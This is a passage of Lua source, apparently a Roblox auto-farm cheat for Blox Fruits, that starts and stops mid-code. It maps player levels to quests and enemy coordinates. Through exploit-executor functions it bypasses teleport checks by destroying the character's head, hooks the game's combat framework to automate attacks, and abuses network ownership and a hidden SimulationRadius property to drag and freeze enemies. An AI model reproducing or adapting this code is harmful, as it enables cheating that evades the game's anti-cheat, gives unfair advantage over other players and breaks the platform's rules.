                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2025 or MyLevel <= 2049 then
                                Ms = "Demonic Soul"
                                NaemQuest = "HauntedQuest2"
                                LevelQuest = 1
                                NameMon = "Demonic Soul"
                                CFrameQuest = CFrame.new(-9514.78027, 171.162918, 6078.82373, 0.301918149, 7.4535027e-09, 0.953333855, -3.22802141e-09, 1, -6.79604995e-09, -0.953333855, -1.02553133e-09, 0.301918149)
                                CFrameMon = CFrame.new(-9503.9921875, 272.1305847167969, 6250.5703125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2050 or MyLevel <= 2074 then
                                Ms = "Posessed Mummy" 
                                NaemQuest = "HauntedQuest2"
                                LevelQuest = 2
                                NameMon = "Posessed Mummy"
                                CFrameQuest = CFrame.new(-9514.78027, 171.162918, 6078.82373, 0.301918149, 7.4535027e-09, 0.953333855, -3.22802141e-09, 1, -6.79604995e-09, -0.953333855, -1.02553133e-09, 0.301918149)
                                CFrameMon = CFrame.new(-9589.93848, 4.85058546, 6190.27197)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2075 or MyLevel <= 2099 then
                                Ms = "Peanut Scout"
                                NaemQuest = "NutsIslandQuest"
                                LevelQuest = 1
                                NameMon = "Peanut Scout"
                                CFrameQuest = CFrame.new(-2075.9643554688, 38.129207611084, -10172.815429688)
                                CFrameMon = CFrame.new(-2150.587890625, 122.49767303467, -10358.994140625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2100 or MyLevel <= 2124 then
                                Ms = "Peanut President"
                                NaemQuest = "NutsIslandQuest"
                                LevelQuest = 2
                                NameMon = "Peanut President"
                                CFrameQuest = CFrame.new(-2075.9643554688, 38.129207611084, -10172.815429688)
                                CFrameMon = CFrame.new(-2150.587890625, 122.49767303467, -10358.994140625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2125 or MyLevel <= 2149 then
                                Ms = "Ice Cream Chef"
                                NaemQuest = "IceCreamIslandQuest"
                                LevelQuest = 1
                                NameMon = "Ice Cream Chef"
                                CFrameQuest = CFrame.new(-819.84533691406, 65.845329284668, -10965.487304688)
                                CFrameMon = CFrame.new(-890.55895996094, 186.34135437012, -11127.306640625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2150 or MyLevel <= 2199 then
                                Ms = "Ice Cream Commander"
                                NaemQuest = "IceCreamIslandQuest"
                                LevelQuest = 2
                                NameMon = "Ice Cream Commander"
                                CFrameQuest = CFrame.new(-819.84533691406, 65.845329284668, -10965.487304688)
                                CFrameMon = CFrame.new(-890.55895996094, 186.34135437012, -11127.306640625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2200 or MyLevel <= 2224 then
                                Ms = "Cookie Crafter"
                                NaemQuest = "CakeQuest1"
                                LevelQuest = 1
                                NameMon = "Cookie Crafter"
                                CFrameQuest = CFrame.new(-2022.3, 36.9276, -12031)
                                CFrameMon = CFrame.new(-2280.569091796875, 89.83930206298828, -12041.4326171875)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2225 or MyLevel <= 2249 then
                                Ms = "Cake Guard"
                                NaemQuest = "CakeQuest1"
                                LevelQuest = 2
                                NameMon = "Cake Guard"
                                CFrameQuest = CFrame.new(-2022.3, 36.9276, -12031)
                                CFrameMon = CFrame.new(-1621.9512939453125, 195.68287658691406, -12281.0908203125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2250 or MyLevel <= 2274 then
                                Ms = "Baking Staff"
                                NaemQuest = "CakeQuest2"
                                LevelQuest = 1
                                NameMon = "Baking Staff"
                                CFrameQuest = CFrame.new(-1928.32, 37.7297, -12840.6)
                                CFrameMon = CFrame.new(-1912.928955078125, 113.134033203125, -12990.53515625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2275 or MyLevel <= 2299 then
                                Ms = "Head Baker"
                                NaemQuest = "CakeQuest2"
                                LevelQuest = 2
                                NameMon = "Head Baker"
                                CFrameQuest = CFrame.new(-1927.9107666015625, 37.79813003540039, -12843.78515625)
                                CFrameMon = CFrame.new(-2203.302490234375, 109.90937042236328, -12788.7333984375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2300 or MyLevel <= 2324 then
                                Ms = "Cocoa Warrior"
                                NaemQuest = "ChocQuest1"
                                LevelQuest = 1
                                NameMon = "Cocoa Warriors"
                                CFrameQuest = CFrame.new(231.75, 23.9003, -12200.3)
                                CFrameMon = CFrame.new(89.75547790527344, 73.66654968261719, -12315.4609375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2325 or MyLevel <= 2349 then
                                Ms = "Chocolate Bar Battler"
                                NaemQuest = "ChocQuest1"
                                LevelQuest = 2
                                NameMon = "Chocolate Bar Battler"
                                CFrameQuest = CFrame.new(231.75, 23.9003, -12200.3)
                                CFrameMon = CFrame.new(614.6710205078125, 81.79888153076172, -12578.4521484375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2350 or MyLevel <= 2374 then
                                Ms = "Sweet Thief"
                                NaemQuest = "ChocQuest2"
                                LevelQuest = 1
                                NameMon = "Sweet Thiefs"
                                CFrameQuest = CFrame.new(147.222900390625, 24.819623947143555, -12775.2890625)
                                CFrameMon = CFrame.new(-92.28578186035156, 132.29556274414062, -12655.9111328125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2375 or MyLevel <= 2399 then
                                Ms = "Candy Rebel"
                                NaemQuest = "ChocQuest2"
                                LevelQuest = 2
                                NameMon = "Candy Rebel"
                                CFrameQuest = CFrame.new(147.222900390625, 24.819623947143555, -12775.2890625)
                                CFrameMon = CFrame.new(66.337265, 27.430994, -12946.5674, -0.825375617, -7.78806708e-08, -0.564584017, -5.46535652e-08, 1, -5.80444244e-08, 0.564584017, -1.70519225e-08, -0.825375617)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2400 or MyLevel <= 2424 then
                                Ms = "Candy Pirate"
                                NaemQuest = "CandyQuest1"
                                LevelQuest = 1
                                NameMon = "Candy Pirate"
                                CFrameQuest = CFrame.new(-1148.0078125, 14.450507164001465, -14445.0654296875)
                                CFrameMon = CFrame.new(-1424.1436767578125, 114.91070556640625, -14604.2041015625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2425 or MyLevel <= 2449 then
                                Ms = "Snow Demon"
                                NaemQuest = "CandyQuest1"
                                LevelQuest = 2
                                NameMon = "Snow Demon"
                                CFrameQuest = CFrame.new(-1148.0078125, 14.450507164001465, -14445.0654296875)
                                CFrameMon = CFrame.new(-847.4754028320312, 114.70159149169922, -14408.5927734375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2450 or MyLevel <= 2474 then
                                Ms = "Isle Outlaw"
                                NaemQuest = "TikiQuest1"
                                LevelQuest = 1
                                NameMon = "Isle Outlaw"
                                CFrameQuest = CFrame.new(-16545.1640625, 56.00381088256836, -176.88841247558594)
                                CFrameMon = CFrame.new(-16269.5517578125, 137.5306854248047, -163.51524353027344)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2475 or MyLevel <= 2499 then
                                Ms = "Island Boy"
                                NaemQuest = "TikiQuest1"
                                LevelQuest = 2
                                NameMon = "Island Boy"
                                CFrameQuest = CFrame.new(-16545.1640625, 56.00381088256836, -176.88841247558594)
                                CFrameMon = CFrame.new(-16851.650390625, 103.24150085449219, -179.14004516601562)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2500 or MyLevel <= 2524 then
                                Ms = "Sun-kissed Warrior"
                                NaemQuest = "TikiQuest2"
                                LevelQuest = 1
                                NameMon = "Sun-kissed Warrior"
                                CFrameQuest = CFrame.new(-16541.50390625, 56.952110290527344, 1054.2220458984375)
                                CFrameMon = CFrame.new(-16250.5224609375, 94.38502502441406, 1006.6849975585938)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel >= 2525 then
                                Ms = "Isle Champion"
                                NaemQuest = "TikiQuest2"
                                LevelQuest = 2
                                NameMon = "Isle Champion"
                                CFrameQuest = CFrame.new(-16541.50390625, 56.952110290527344, 1054.2220458984375)
                                CFrameMon = CFrame.new(-16775.427734375, 82.45645904541016, 1027.5484619140625)
                            
                        end
                    end
                end
    
    local fastwait,slowwait = task.wait(),wait()
    
    local r=game:GetService("Players").LocalPlayer
    getgenv().ToTarget=function(p)
        task.spawn(function()
            pcall(function()
                if r:DistanceFromCharacter(p.Position)<=300 then 
                    r.Character.HumanoidRootPart.CFrame=p
                else if not game.Players.LocalPlayer.Character:FindFirstChild("Root")then 
                    local K=Instance.new("Part",game.Players.LocalPlayer.Character)
                    K.Size=Vector3.new(1,0.5,1)
                    K.Name="Root"
                    K.Anchored=true
                    K.Transparency=1
                    K.CanCollide=false
                    K.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,20,0)
                end
    
                local U=(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude
                local z=game:service("TweenService")
                local B=TweenInfo.new((p.Position-game.Players.LocalPlayer.Character.Root.Position).Magnitude/300,Enum.EasingStyle.Linear)
                local S,g=pcall(function()
                    local q=z:Create(game.Players.LocalPlayer.Character.Root,B,{CFrame=p})
    q:Play()
    end)
    if not S then 
        return g
    end
    game.Players.LocalPlayer.Character.Root.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    if S and game.Players.LocalPlayer.Character:FindFirstChild("Root")then 
        pcall(function()
            if(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude>=20 then 
                spawn(function()
                    pcall(function()if(game.Players.LocalPlayer.Character.Root.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude>150 then game.Players.LocalPlayer.Character.Root.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    else game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Players.LocalPlayer.Character.Root.CFrame
    end
    end)
    end)
    elseif(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude>=10 and(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude<20 then 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=p
    elseif(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude<10 then 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=p
    end
    end)
    end
    end
    end)
    end)
    end
    spawn(function()
        game:GetService("RunService").Heartbeat:Connect(function()
            if _G.AutoFarmL then
                setfflag("HumanoidParallelRemoveNoPhysics", "False")
                setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
                game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
            end
        end)
    end)
    task.spawn(function() 
    _G.Type=math.random(1,5);
    while task.wait(.2) do
    _G.Type=math.random(1,5);
    end;
    end);
    
    require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework.Particle.SlashHit).playAt = function() return nil end;
    getgenv().A = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib).wrapAttackAnimationAsync 
    getgenv().B = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.Particle).play
    spawn(function()
        while wait() do
            if _G.AutoFarmL then
                pcall(function()
                    require(game:GetService("ReplicatedStorage").CombatFramework.RigLib).wrapAttackAnimationAsync =function(a1,a2,a3,a4,a5)
                        local GetBladeHits = require(game:GetService("ReplicatedStorage").CombatFramework.RigLib).getBladeHits(a2,a3,a4)
                        if GetBladeHits then
                            require(game:GetService("ReplicatedStorage").CombatFramework.RigLib).play = function() end;
                            a1:Play(0.1, 0.1, 0.1);
                            a5(GetBladeHits);
                            require(game:GetService("ReplicatedStorage").CombatFramework.RigLib).play = getgenv().B 
                            wait(.5);
                            a1:Stop();
                        end;
                    end;
                end);
            end
        end;
    end);
    getgenv().BringMobs = function(F, z)
        coroutine.wrap(function()
            pcall(function()
                for U, d in pairs(game.Workspace.Enemies:GetChildren()) do
                    if d:FindFirstChild("Humanoid") and d:FindFirstChild("HumanoidRootPart") and (d.Name == z) then
                        if isnetworkowner ~= nil and isnetworkowner(d:FindFirstChild("HumanoidRootPart")) then
                            d:FindFirstChild("HumanoidRootPart").Transparency = 1
                            d:FindFirstChild("Humanoid"):ChangeState(11)
                            d:FindFirstChild("HumanoidRootPart").Size = Vector3.new(60,60,60)
                            d:FindFirstChild("Humanoid").WalkSpeed = 0
                            d:FindFirstChild("Humanoid").JumpPower = 0
                            if not d:FindFirstChild("HumanoidRootPart"):FindFirstChild("BV") then
                                local m = Instance.new("BodyVelocity")
                                m.Parent = d:FindFirstChild("HumanoidRootPart")
                                m.Name = "BV"
                                m.MaxForce = Vector3.new(100000, 100000, 100000)
                                m.Velocity = Vector3.new(0, 0, 0)
                            end
                            if d:FindFirstChild("Humanoid"):FindFirstChild("Animator") then
                                d:FindFirstChild("Humanoid"):FindFirstChild("Animator"):Remove()
                            end
                            d:FindFirstChild("HumanoidRootPart").CFrame = F
                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                        elseif (F.Position - d.HumanoidRootPart.Position).magnitude < 300 then
                            d:FindFirstChild("HumanoidRootPart").Transparency = 1
                            d:FindFirstChild("Humanoid"):ChangeState(11)
                            d:FindFirstChild("HumanoidRootPart").Size = Vector3.new(60,60,60)
                            d:FindFirstChild("Humanoid").WalkSpeed = 0
                            d:FindFirstChild("Humanoid").JumpPower = 0
                            if not d:FindFirstChild("HumanoidRootPart"):FindFirstChild("BV") then
                                local u = Instance.new("BodyVelocity")
                                u.Parent = d:FindFirstChild("HumanoidRootPart")
                                u.Name = "BV"
                                u.MaxForce = Vector3.new(100000, 100000, 100000)
                                u.Velocity = Vector3.new(0, 0, 0)
                            end
                            if d:FindFirstChild("Humanoid"):FindFirstChild("Animator") then
                                d:FindFirstChild("Humanoid"):FindFirstChild("Animator"):Remove()
                            end
                            d:FindFirstChild("HumanoidRootPart").CFrame = F
                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                        end
                    end
                end
            end)
        end)()
    end
spawn(function()
    pcall(function()
        while wait() do
            if _G.AutoFarmL then
                if game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
                    game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible = false
                end
            end
        end
    end)
end)
spawn(function()
    while task.wait() do
        pcall(function()
            CheckQuest()
                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                    if _G.AutoFarmL then
                    if v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                        if v.Name == NameMon then
                            if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 400 then
                            if isnetworkowner(v.HumanoidRootPart) then
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.CFrame = PosMon
                                if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                                end
                                v.Humanoid:ChangeState(14)
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                end
                            end
                        end
                    elseif v.Name == "Factory Staff" then
                            if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 150 then
                            if isnetworkowner(v.HumanoidRootPart) then
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid.Sit = true
                                v.Humanoid.PlatformStand = true
                                if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                                end
                                v.Humanoid:ChangeState(14)
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                end
                            end
                    elseif v.Name == "Monkey" then
                            if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 100 then
                            if isnetworkowner(v.HumanoidRootPart) then
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid.Sit = true
                                v.Humanoid.PlatformStand = true
                                if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                                end
                                v.Humanoid:ChangeState(14)
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                            end
                            elseif v.Name == "Snowman" then
                                if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 100 then
                                if isnetworkowner(v.HumanoidRootPart) then
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.CFrame = PosMon
                                v.Humanoid.Sit = true
                                v.Humanoid.PlatformStand = true
                                if v.Humanoid:FindFirstChild("Animator") then
                                v.Humanoid.Animator:Destroy()
                                end
                                v.Humanoid:ChangeState(14)
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                end
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)
    spawn(function()
        while task.wait() do
            if _G.AutoFarmL then
                pcall(function()
                if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then
                    MagnetActive = false;
                        CheckQuest();
                        getgenv().ToPos(CFrameQuest);
                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude <= 20 then
                            CheckQuest();
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameQuest
                            task.wait(.5);
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", NaemQuest, LevelQuest);
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint");
                        end;
                    elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                        pcall(function()
                            CheckQuest();
                            if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name == NameMon and v:FindFirstChild("Humanoid") then
                                        if v.Humanoid.Health > 0 then
                                            repeat task.wait()
                                                if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                                                    --Extraz
                                                    if LevelQuest == 1 and NaemQuest == "TikiQuest2" then
                                                        getgenv().BringMobs(v.HumanoidRootPart.CFrame , NameMon)
                                                        v.HumanoidRootPart.CanCollide = false
                                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                        if v.Humanoid:FindFirstChild("Animator") then
                                                            v.Humanoid.Animator:Destroy()
                                                        end
                                                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                                        getgenv().ToPos(v.HumanoidRootPart.CFrame*CFrame.new(0,40,0))
                                                        Attack()
                                                        if isnetworkowner(v.HumanoidRootPart) then
                                                        v.HumanoidRootPart.CanCollide = false;
                                                        v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                                        PosMon = v.HumanoidRootPart.CFrame
                                                        v.Humanoid.JumpPower = 0;
                                                        v.Humanoid.WalkSpeed = 0;
                                                        v.HumanoidRootPart.CanCollide = false
                                                        if v.Humanoid:FindFirstChild("Animator") then
                                                            v.Humanoid.Animator:Destroy();
                                                        end;
                                                        v.Humanoid:ChangeState(14);
                                                        else
                                                        v.HumanoidRootPart.CanCollide = false;
                                                        v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                                        PosMon = v.HumanoidRootPart.CFrame
                                                        v.Humanoid.JumpPower = 0;
                                                        v.Humanoid.WalkSpeed = 0;
                                                        v.HumanoidRootPart.CanCollide = false;
                                                        if v.Humanoid:FindFirstChild("Animator") then
                                                            v.Humanoid.Animator:Destroy();
                                                        end;
                                                        v.Humanoid:ChangeState(14);
                                                        end;
                                                    
                                                        MagnetActive = true;
                                                    else
                                                        if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
                                                            getgenv().BringMobs(v.HumanoidRootPart.CFrame , NameMon)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                            if v.Humanoid:FindFirstChild("Animator") then
                                                                v.Humanoid.Animator:Destroy()
                                                            end
                                                            getgenv().ToPos(v.HumanoidRootPart.CFrame*CFrame.new(0,40,0))
                                                            Attack()
                                                            if isnetworkowner(v.HumanoidRootPart) then
                                                            v.HumanoidRootPart.CanCollide = false;
                                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            v.Humanoid.JumpPower = 0;
                                                            v.Humanoid.WalkSpeed = 0;
                                                            v.HumanoidRootPart.CanCollide = false
                                                            if v.Humanoid:FindFirstChild("Animator") then
                                                                v.Humanoid.Animator:Destroy();
                                                            end;
                                                            v.Humanoid:ChangeState(14);
                                                            else
                                                            v.HumanoidRootPart.CanCollide = false;
                                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            v.Humanoid.JumpPower = 0;
                                                            v.Humanoid.WalkSpeed = 0;
                                                            v.HumanoidRootPart.CanCollide = false;
                                                            if v.Humanoid:FindFirstChild("Animator") then
                                                                v.Humanoid.Animator:Destroy();
                                                            end;
                                                            v.Humanoid:ChangeState(14);
                                                            end;
                                                        
                                                            MagnetActive = true;
                                                        else
                                                            MagnetActive = false   ; 
                                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest");
                                                        end
                                                    end
                                                else
                                                    MagnetActive = false;
                                                    CheckQuest();
                                                    getgenv().ToPos(CFrameMon);
                                                end
                                            until not v.Parent or v.Humanoid.Health <= 0 or _G.AutoFarmL == false or game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == false or not game:GetService("Workspace").Enemies:FindFirstChild(v.Name)
                                        end;
                                    end;
                                end;
                            else
                                MagnetActive = false;
                                CheckQuest();
                                getgenv().ToPos(CFrameMon);
                                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameMon.Position).Magnitude <= 20 then
                                    PUK()
                                end
                            end;
                        end);
                    end;
                end);
            end;
        end;
    end);
spawn(function()
    while wait() do
        if _G.Auto_Farm_Boss then
            pcall(function()
                CheckBossQuest()
